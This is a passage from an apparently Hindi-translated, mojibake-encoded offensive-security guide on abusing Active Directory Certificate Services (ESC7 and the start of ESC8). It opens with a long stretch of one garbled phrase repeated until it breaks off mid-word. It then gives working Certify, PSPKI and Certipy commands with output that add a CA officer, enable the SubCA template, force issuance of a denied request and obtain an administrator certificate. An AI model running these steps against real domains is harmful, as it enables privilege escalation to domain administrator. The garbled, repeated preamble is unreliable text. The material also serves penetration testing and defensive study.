рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдз
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### рд╣рдорд▓рд╛ 2

#### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

{% hint style="warning" %}
**рдкрд┐рдЫрд▓реЗ рд╣рдорд▓реЗ** рдореЗрдВ **`Manage CA`** рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рддрд╛рдХрд┐ **EDITF\_ATTRIBUTESUBJECTALTNAME2** рдзреНрд╡рдЬ рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ **ESC6 рд╣рдорд▓рд╛** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рд▓реЗрдХрд┐рди рдпрд╣ рдХреЛрдИ рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рдбрд╛рд▓реЗрдЧрд╛ рдЬрдм рддрдХ CA рд╕реЗрд╡рд╛ (`CertSvc`) рдХреЛ рдкреБрдирд░рд╛рд░рдВрдн рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ред рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ `Manage CA` рдПрдХреНрд╕реЗрд╕ рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕реЗрд╡рд╛ рдХреЛ рдкреБрдирд░рд╛рд░рдВрдн рдХрд░рдиреЗ рдХреА рднреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдпрд╣ рдирд╣реАрдВ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗрд╡рд╛ рдХреЛ рджреВрд░рд╕реНрде рд╕реЗ рдкреБрдирд░рд╛рд░рдВрдн рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдЕрдзрд┐рдХрд╛рдВрд╢ рдкреИрдЪ рдХрд┐рдП рдЧрдП рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ рдордИ 2022 рд╕реБрд░рдХреНрд╖рд╛ рдЕрдкрдбреЗрдЯ рдХреЗ рдХрд╛рд░рдг **ESC6** рдЕрдХреНрд╕рд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ред
{% endhint %}

рдЗрд╕рд▓рд┐рдП, рдпрд╣рд╛рдВ рдПрдХ рдФрд░ рд╣рдорд▓рд╛ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред

рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ:

* рдХреЗрд╡рд▓ **`ManageCA` рдЕрдиреБрдорддрд┐**
* **`Manage Certificates`** рдЕрдиреБрдорддрд┐ (рдХреЛ **`ManageCA`** рд╕реЗ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)
* рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ **`SubCA`** рдХреЛ **рд╕рдХреНрд░рд┐рдп** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП (рдХреЛ **`ManageCA`** рд╕реЗ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)

рдпрд╣ рддрдХрдиреАрдХ рдЙрд╕ рддрдереНрдп рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреА рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬрд┐рдирдХреЗ рдкрд╛рд╕ `Manage CA` _рдФрд░_ `Manage Certificates` рдПрдХреНрд╕реЗрд╕ рдЕрдзрд┐рдХрд╛рд░ рд╣реИрдВ, рд╡реЗ **рд╡рд┐рдлрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЕрдиреБрд░реЛрдз** рдЬрд╛рд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред **`SubCA`** рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ **ESC1 рдХреЗ рд▓рд┐рдП рд╡рдВрд╢рд╛рд╡рд╢** рд╣реИ, рд▓реЗрдХрд┐рди **рдХреЗрд╡рд▓ рдкреНрд░рд╢рд╛рд╕рдХ** рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдирд╛рдорд╛рдВрдХрд┐рдд рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдПрдХ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** **`SubCA`** рдореЗрдВ рдирд╛рдорд╛рдВрдХрд┐рдд рд╣реЛрдиреЗ рдХрд╛ **рдЕрдиреБрд░реЛрдз** рдХрд░ рд╕рдХрддрд╛ рд╣реИ - рдЬрд┐рд╕реЗ **рдЗрдирдХрд╛рд░** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ - рд▓реЗрдХрд┐рди **рдлрд┐рд░ рдкреНрд░рдмрдВрдзрдХ рджреНрд╡рд╛рд░рд╛ рдЬрд╛рд░реА** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

#### рджреБрд░реБрдкрдпреЛрдЧ

рдЖрдк рдЕрдкрдиреЗ рдЖрдк рдХреЛ **`Manage Certificates`** рдПрдХреНрд╕реЗрд╕ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдкрдиреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдПрдХ рдирдП рдЕрдзрд┐рдХрд╛рд░реА рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛрдбрд╝рдХрд░ред
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЛ `-enable-template` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде CA рдкрд░ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, `SubCA` рдЯреЗрдореНрдкрд▓реЗрдЯ рд╕рдХреНрд░рд┐рдп рд╣реИред
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
рдпрджрд┐ рд╣рдо рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдкреВрд░реНрд╡рд╛рдкреЗрдХреНрд╖рд╛рдПрдВ рдкреВрд░реА рдХрд░ рдЪреБрдХреЗ рд╣реИрдВ, рддреЛ рд╣рдо **`SubCA` рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдХреЗ** рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**рдпрд╣ рдЕрдиреБрд░реЛрдз рдЕрд╕реНрд╡реАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**, рд▓реЗрдХрд┐рди рд╣рдо рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЛ рд╕рд╣реЗрдЬреЗрдВрдЧреЗ рдФрд░ рдЕрдиреБрд░реЛрдз рдЖрдИрдбреА рдиреЛрдЯ рдХрд░реЗрдВрдЧреЗред
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
рд╣рдорд╛рд░реЗ **`Manage CA` рдФрд░ `Manage Certificates`** рдХреЗ рд╕рд╛рде, рд╣рдо рдлрд┐рд░ `ca` рдХрдорд╛рдВрдб рдФрд░ `-issue-request <request ID>` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рд╡рд┐рдлрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЕрдиреБрд░реЛрдз рдЬрд╛рд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
рдФрд░ рдЕрдВрдд рдореЗрдВ, рд╣рдо `req` рдХрдорд╛рдВрдб рдФрд░ `-retrieve <request ID>` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде **рдЬрд╛рд░реА рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдкреНрдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM рд░рд┐рд▓реЗ рдПрдбреА рд╕реАрдПрд╕ рдПрдЪрдЯреАрдЯреАрдкреА рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ - ESC8

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

{% hint style="info" %}
рдРрд╕реЗ рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдБ **рдПрдбреА рд╕реАрдПрд╕ рд╕реНрдерд╛рдкрд┐рдд рд╣реИ**, рдпрджрд┐ рдПрдХ **рд╡реЗрдм рдирд╛рдорд╛рдВрдХрди рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╡рдВрд╢рд╛рдзрд┐рдХрд╛рд░реА** рдореМрдЬреВрдж рд╣реИ рдФрд░ рдХрдо рд╕реЗ рдХрдо рдПрдХ **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдкреНрд░рдХрд╛рд╢рд┐рдд рд╣реИ** рдЬреЛ **рдбреЛрдореЗрди рдХрдВрдкреНрдпреВрдЯрд░ рдирд╛рдорд╛рдВрдХрди рдФрд░ рдЧреНрд░рд╛рд╣рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рдЬреИрд╕реЗ рдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ **`рдорд╢реАрди`** рдЯреЗрдореНрдкрд▓реЗрдЯ), рддреЛ **рдХрд┐рд╕реА рднреА рдХрдВрдкреНрдпреВрдЯрд░ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдХреНрд╖рдорддрд╛ рдмрдирд╛рдирд╛ рд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕реНрдкреВрд▓рд░ рд╕реЗрд╡рд╛ рд╕рдХреНрд░рд┐рдп рд╣реИ**!
{% endhint %}

